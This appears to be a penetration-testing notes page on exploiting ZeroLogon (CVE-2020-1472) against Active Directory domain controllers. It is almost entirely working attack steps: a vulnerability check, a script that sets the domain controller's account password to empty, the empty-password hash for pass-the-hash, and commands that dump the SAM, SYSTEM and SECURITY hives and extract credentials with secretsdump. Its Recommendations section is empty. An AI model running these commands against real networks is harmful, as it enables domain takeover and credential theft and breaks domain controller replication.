---
layout: default
title: ZeroLogon [CVE-2020-1472]
parent: Active Directory
nav_order: 16
permalink: /ad/zerologon/
---

# ZeroLogon [CVE-2020-1472]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> Following exploit **changes the password** of a domain controller's account, which **breaks communications with other domain controllers** (DCSync) until you will restore the original password.

## Vulnerability

Everything is explained [here](https://www.secura.com/blog/zero-logon).

## Prerequisites

- Network access to the domain controller.

## Exploit

To check if a domain controller is vulnerable to Zerologon, you can use either `CrackMapExec` or the [SecuraBV GitHub repository](https://github.com/SecuraBV/CVE-2020-1472).

```bash
# You don't need to be authenticated on the domain.
cme smb $DC_IP -M zerologon
```

If the domain controllers appears to be vulnerable, you can attempt the exploit with this [GitHub repository](https://github.com/risksense/zerologon).

```bash
python3 set_empty_pw.py $DC_NAME $DC_IP
```

This will set the **domain controller's account password as empty**. So you are now able to use `impacket` scripts doing Pass-the-Hash with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password.

Then to reset the previous password, follow these instructions.

```bash
# Connect to the DC with impacket-wmiexec.
impacket-wmiexec $DOMAIN/$USERNAME:$PASSWORD@$DC_IP

# Type following commands.
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save

# Using previous files, you can recover the original NT.
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Finally, restore the original NT on the DC.
python3 reinstall_original_pw.py $DC_NAME $DC_IP $ORIGAL_NT_HASH
```

## Recommendations

TBD